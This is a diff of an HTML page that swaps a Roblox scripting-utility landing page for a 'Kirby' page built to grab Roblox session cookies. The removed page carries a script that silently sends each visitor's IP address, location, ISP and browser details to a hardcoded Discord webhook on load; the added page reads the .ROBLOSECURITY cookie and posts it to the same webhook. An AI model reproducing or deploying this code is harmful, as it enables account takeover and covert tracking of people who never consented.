@@ -1,210 +1,141 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=650">
-<title>Ascendify</title>
-<style>
-@import url("https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300..700&display=swap");
-html { background: rgb(16,0,32); height: 100%; margin: 0; padding: 0; }
-button, a, select, [role="button"], [tabindex]:not([tabindex="-1"]) { cursor: default !important; }
-body { font-family: "Space Grotesk", sans-serif !important; background: rgb(16,0,32); }
-@keyframes fadeIn { 0% { opacity: 0; } 100% { opacity: 1; } }
-@keyframes scaleFadeIn { 0% { opacity: 0; transform: scale(0.95) translateY(10px); transform-origin: center center; } 100% { opacity: 1; transform: scale(1) translateY(0); transform-origin: center center; } }
-@keyframes blurScaleFadeIn { 0% { opacity: 0; filter: blur(10px); transform: scale(0.95) translateY(10px); transform-origin: center center; } 100% { opacity: 1; filter: blur(0px); transform: scale(1) translateY(0); transform-origin: center center; } }
-@keyframes scaleFadeOut { 0% { opacity: 1; transform: scale(1); transform-origin: center center; } 100% { opacity: 0; transform: scale(0.95) translateY(-10px); transform-origin: center center; } }
-.group:hover .dropdown-menu { opacity: 1; visibility: visible; animation: scaleFadeIn 0.2s; }
-.group:not(:hover) .dropdown-menu a { animation: scaleFadeOut 0.2s ease-out forwards; visibility: hidden; }
-::-webkit-scrollbar { border: none; margin: 15px; background-color: #100020; width: 5px; }
-::-webkit-scrollbar-track { background: none; }
-::-webkit-scrollbar-thumb { background-color: rgba(128,0,128,0.2); border-radius: 5px; }
-</style>
-<script src="https://cdn.tailwindcss.com"></script>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-<link rel="icon" type="image/x-icon" href="/2b84dff6-efe6-48e5-9304-1f954b3904f6-removebg-preview.png">
-<meta name="description" content="Ascendify is a powerful client-sided LuaU scripting utility for ROBLOX.">
-<meta name="keywords" content="roblox, scripting, coding, lua, luau">
-</head>
-<body class="text-white select-none animate-[fadeIn_0.3s]">
-
-<div id="content" class="relative z-10 mx-12 lg:mx-0">
-<header class="sticky top-0 z-20 w-full h-[80px]">
-<div class="absolute inset-0 z-[-10] mx-auto max-w-screen lg:max-w-[75%]"></div>
-<div id="hdr" class="absolute rounded-lg left-1/2 top-0 transform -translate-x-1/2 mt-1.5 py-1 mx-auto flex w-full max-w-screen lg:max-w-[75%] items-center transition-all">
-<div class="flex items-center flex-1">
-<img src="/2b84dff6-efe6-48e5-9304-1f954b3904f6-removebg-preview.png" class="max-w-6 mr-4">
-<h1 class="text-purple-300 text-xl font-semibold">Ascendify</h1>
-</div>
-<nav class="flex space-x-6 items-center justify-center">
-<a href="/" class="p-1 text-white text-lg font-medium transition-all hover:text-purple-300">Home</a>
-<a href="#purchase" class="p-1 text-white text-lg font-medium transition-all hover:text-purple-300">Purchase</a>
-<li class="p-1 group relative list-none">
-<a class="text-white text-lg transition-all font-medium group-hover:text-purple-300 dropdown-toggle flex items-center">
-<i class="fa-solid fa-chevron-down text-xs mr-2 transition-all group-hover:rotate-180"></i>
-Legal
-</a>
-<div class="p-1 rounded-lg space-y-0.5 absolute dropdown-menu backdrop-blur-sm hidden bg-purple-950/30 text-sm text-white shadow overflow-hidden z-50 w-full min-w-max">
-<a class="block rounded-lg px-5 py-3 font-medium transition-all mb-1 hover:bg-purple-900/50" href="/terms">Terms of Service</a>
-<a class="block rounded-lg px-5 py-3 font-medium transition-all mb-1 hover:bg-purple-900/50" href="/privacy">Privacy Policy</a>
-</div>
-</li>
-</nav>
-<div class="flex-1"></div>
-</div>
-</header>
-<div class="flex flex-col items-center justify-center mt-56 max-w-screen mx-auto text-center">
-<div class="space-y-4">
-<h1 class="text-6xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-purple-600">Robust execution</h1>
-<h2 class="text-xl text-purple-200/80">
-Premium scripting utility for <span class="text-purple-300 font-bold">Roblox</span>
-</h2>
-<div class="flex justify-center space-x-2 mt-4">
-<a href="#purchase">
-<button class="bg-purple-600 rounded-lg font-semibold text-white px-6 py-2 transition-all hover:bg-purple-700 hover:-translate-y-1"><i class="fa-solid fa-rocket-launch mr-2"></i>Get Started</button>
-</a>
-<a href="https://discord.gg/TH9HrT5NNv">
-<button class="border border-purple-600/50 rounded-lg font-semibold text-white px-6 py-2 transition-all hover:bg-purple-900/30 hover:border-purple-600 hover:-translate-y-1"><i class="fa-brands fa-discord mr-2"></i>Discord</button>
-</a>
-<button onclick="openRedeemModal()" class="border border-purple-600/50 rounded-lg font-semibold text-white px-6 py-2 transition-all hover:bg-purple-900/30 hover:border-purple-600 hover:-translate-y-1"><i class="fa-solid fa-key mr-2"></i>Redeem Code</button>
-</div>
-</div>
-<div class="w-full max-w-[786px] pt-20 flex justify-center items-center relative">
-<div class="w-full aspect-[786/293] relative">
-<div class="absolute inset-0">
-<img src="/image.jpg" class="skew-x-6 rotate-6 w-full h-full rounded-lg shadow-[0_15px_30px_rgba(0,0,0,0.3)] object-contain">
-</div>
-</div>
-</div>
-</div>
-<div class="lg:max-w-[70%] max-w-screen mx-auto pt-32">
-<h1 class="text-purple-300 font-semibold text-3xl">Why choose Ascendify? </h1>
-<h1 class="text-purple-200/80 text-xl">Here's why we're the best </h1>
-<div class="grid lg:grid-cols-3 grid-cols-2 gap-2 w-full h-full mt-12 pb-24 items-stretch">
-<div style="transition: 0.15s ease-out;" class="rot rounded-lg bg-purple-950/20 hover:bg-purple-950/30 backdrop-blur-sm flex flex-col p-10 h-full">
-<div class="flex items-center space-x-3">
-<div class="w-12 h-12 flex items-center justify-center bg-purple-900/50 rounded-full">
-<i class="fa-solid fa-puzzle-piece text-purple-400 text-2xl"></i>
-</div>
-<a class="text-white text-2xl font-semibold">Highly supported</a>
-</div>
-<div class="mt-2">
-<p class="text-purple-200/80 text-md">Designed for versatility, Ascendify supports most script requirements to provide a seamless and stable user experience</p>
-</div>
-</div>
-<!-- The other 5 "Why choose" cards are omitted here for brevity in this message -->
-<!-- ... paste them back if needed ... -->
-</div></div>
-<div id="purchase" class="w-full transition-all duration-[250ms] pb-[100px]">
-<!-- purchase section content ... -->
-</div>
-<div id="overlay" class="animate-[fadeIn_0.3s] fixed inset-0 bg-black bg-opacity-50 hidden z-[100]"></div>
-<div class="fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-[110] w-full max-w-[450px]">
-<!-- all your modals: paymentWidget, notReleasedModal, redeemModal ... -->
-</div>
-
-<!-- ──────────────────────────────────────────────── -->
-<!--                YOUR EXISTING SCRIPTS               -->
-<!-- ──────────────────────────────────────────────── -->
-
-<script>
-window.addEventListener('scroll', () => {
-const header = document.getElementById("hdr")
-if (window.scrollY > 1) {
-header.classList.add("bg-purple-950/20", "backdrop-blur-xl", "shadow", "px-8")
-} else {
-header.classList.remove("bg-purple-950/20", "backdrop-blur-xl", "shadow", "px-8")
-}
-});
-document.addEventListener('DOMContentLoaded', function() {
-const dropdown = document.querySelector('.group');
-const menu = dropdown.querySelector('.dropdown-menu');
-dropdown.addEventListener('mouseenter', () => menu.classList.remove('hidden'));
-dropdown.addEventListener('mouseleave', () => menu.classList.add('hidden'));
-});
-// ... rest of your original script (openWidget, createOrder, redeem logic, hashString, activateLicense, etc.) ...
-</script>
-
-<script>
-const rotElements = document.querySelectorAll(".rot")
-rotElements.forEach( (el) => {
-el.addEventListener("mousemove", (event) => {
-const rect = el.getBoundingClientRect()
-const width = rect.width
-const height = rect.height
-const x = event.clientX - rect.left - width / 2
-const y = event.clientY - rect.top - height / 2
-const xPercent = x / (width / 2)
-const yPercent = y / (height / 2)
-const maxTilt = 8
-const xRotate = yPercent * maxTilt
-const yRotate = xPercent * -maxTilt
-el.style.transform = `perspective(500px) rotateX(${xRotate}deg) rotateY(${yRotate}deg)`
-})
-el.addEventListener("mouseleave", () => {
-el.style.transform = "rotateX(0deg) rotateY(0deg) scale(1)"
-})
-})
-</script>
-
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"9facd51c1d6a4b7c9bab73662b7a712c","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-
-<!-- ──────────────────────────────────────────────── -->
-<!--         IP → DISCORD WEBHOOK LOGGING SCRIPT        -->
-<!-- ──────────────────────────────────────────────── -->
-<script>
-(async function sendVisitorToDiscord() {
-    // === REPLACE THIS LINE WITH YOUR REAL WEBHOOK ===
-    const webhookUrl = "https://discord.com/api/webhooks/1482888700206518307/USe7lSgbClC6aAnRncpl01YhkO0OrG9dAJYDZN47S4IasHVtSadpTVHaFrmf65b4sf5p";
-
-    try {
-        const ipRes = await fetch("https://ip-api.com/json/?fields=query,status,message,country,city,regionName,isp,org,proxy,hosting");
-        if (!ipRes.ok) throw new Error(`IP API failed: ${ipRes.status}`);
-
-        const data = await ipRes.json();
-        if (data.status !== "success") {
-            console.warn("IP lookup failed:", data.message || "unknown reason");
-            return;
-        }
-
-        const ip       = data.query          || "unknown";
-        const country  = data.country        || "?";
-        const city     = data.city           || "?";
-        const region   = data.regionName     || "?";
-        const isp      = (data.isp || data.org || "?").substring(0, 48);
-        const isProxy  = data.proxy || data.hosting ? "Yes (proxy/VPN/Tor?)" : "No";
-
-        const embed = {
-            title:       "🌐 New Ascendify Visitor",
-            color:       0x9F00FF,
-            timestamp:   new Date().toISOString(),
-            fields: [
-                { name: "IP",         value: `\`${ip}\``, inline: true },
-                { name: "Location",   value: `${city}, ${region}, ${country}`, inline: true },
-                { name: "ISP / Org",  value: isp || "—", inline: true },
-                { name: "Proxy/VPN?", value: isProxy, inline: true },
-                { name: "User-Agent", value: "```" + navigator.userAgent.substring(0, 180) + "```", inline: false },
-                { name: "Screen",     value: `${screen.width}×${screen.height} (${window.devicePixelRatio}x)`, inline: true },
-                { name: "Page",       value: window.location.href, inline: false }
-            ],
-            footer: { text: "Client-side visitor log • " + new Date().toLocaleTimeString() }
-        };
-
-        const payload = { content: null, embeds: [embed] };
-
-        const res = await fetch(webhookUrl, {
-            method:  "POST",
-            headers: { "Content-Type": "application/json" },
-            body:    JSON.stringify(payload)
-        });
-
-        if (!res.ok) {
-            console.warn("Webhook failed:", res.status);
-        }
-    } catch (err) {
-        console.warn("[Visitor logger]", err.message || err);
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Kirby - Roblox Cookie to Discord</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0d001a;
+      color: #e0d0ff;
+      margin: 0;
+      padding: 40px;
+      text-align: center;
     }
-})();
-</script>
+    h1 { color: #ff3366; margin-bottom: 8px; }
+    .container {
+      background: rgba(30, 20, 60, 0.9);
+      border-radius: 16px;
+      padding: 30px;
+      max-width: 600px;
+      margin: 0 auto;
+      box-shadow: 0 10px 40px rgba(255,51,102,0.3);
+    }
+    button {
+      background: #ff3366;
+      color: white;
+      border: none;
+      padding: 16px 48px;
+      font-size: 1.3rem;
+      font-weight: bold;
+      border-radius: 50px;
+      cursor: pointer;
+      margin: 30px 0;
+      transition: all 0.3s;
+    }
+    button:hover { background: #ff1a4d; transform: scale(1.05); }
+    #status {
+      margin-top: 20px;
+      padding: 16px;
+      border-radius: 10px;
+      font-size: 1.1rem;
+      min-height: 80px;
+    }
+    .success { background: #1a3a1a; color: #88ff88; }
+    .fail    { background: #3a1a1a; color: #ff8888; }
+    .warning {
+      background: #4a0000;
+      border-left: 5px solid #ff3366;
+      padding: 16px;
+      margin: 20px 0;
+      border-radius: 8px;
+      text-align: left;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Kirby – Send Roblox Cookie to Discord</h1>
+
+    <div class="warning">
+      <strong>Important – read before clicking:</strong><br><br>
+      • This page can only see the cookie if you are <strong>logged in on roblox.com</strong> in this same browser right now.<br>
+      • In 2026, .ROBLOSECURITY is usually <strong>HttpOnly</strong> → this will most likely fail and show "Not visible".<br>
+      • Clicking the button will try to send whatever it finds (or nothing) to your webhook.<br>
+      • Nothing is sent if no cookie is visible.
+    </div>
+
+    <button onclick="sendToWebhook()">Send My Roblox Cookie Now</button>
+
+    <div id="status">Waiting...</div>
+  </div>
+
+  <script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1482888700206518307/USe7lSgbClC6aAnRncpl01YhkO0OrG9dAJYDZN47S4IasHVtSadpTVHaFrmf65b4sf5p";
+
+    async function sendToWebhook() {
+      const status = document.getElementById("status");
+      status.className = "";
+      status.textContent = "Scanning cookies...";
+
+      setTimeout(async () => {
+        try {
+          // Try to read the cookie
+          const cookieStr = document.cookie;
+          let token = null;
+
+          const parts = cookieStr.split('; ');
+          for (let part of parts) {
+            if (part.startsWith('.ROBLOSECURITY=')) {
+              token = part.split('=')[1];
+              break;
+            }
+          }
+
+          if (!token) {
+            status.className = "fail";
+            status.innerHTML = "No .ROBLOSECURITY cookie visible in this browser session.<br><br>Most likely because:<br>• It's HttpOnly (normal)<br>• Not logged in on roblox.com<br>• Using incognito/private mode";
+            return;
+          }
+
+          // Prepare simple payload
+          const payload = {
+            username: "Kirby Roblox Grab",
+            avatar_url: "https://images.rbxcdn.com/75c585f549d54e2d92a4a26d709a4d2d.png",
+            content: null,
+            embeds: [{
+              title: "New Roblox Cookie from Kirby",
+              description: "```yaml\n" + token + "\n```",
+              color: 16711680, // red
+              timestamp: new Date().toISOString(),
+              footer: { text: "Tampa • " + new Date().toLocaleString() }
+            }]
+          };
+
+          status.textContent = "Sending to Discord...";
+
+          const response = await fetch(WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+          });
+
+          if (response.ok) {
+            status.className = "success";
+            status.innerHTML = "✅ Sent successfully!<br>Check your Discord channel.";
+          } else {
+            status.className = "fail";
+            status.innerHTML = "Failed to send (status " + response.status + ")<br>Webhook may be invalid or deleted.";
+          }
+        } catch (err) {
+          status.className = "fail";
+          status.innerHTML = "Error: " + (err.message || "Unknown error");
+        }
+      }, 1000);
+    }
+  </script>
 
 </body>
 </html>
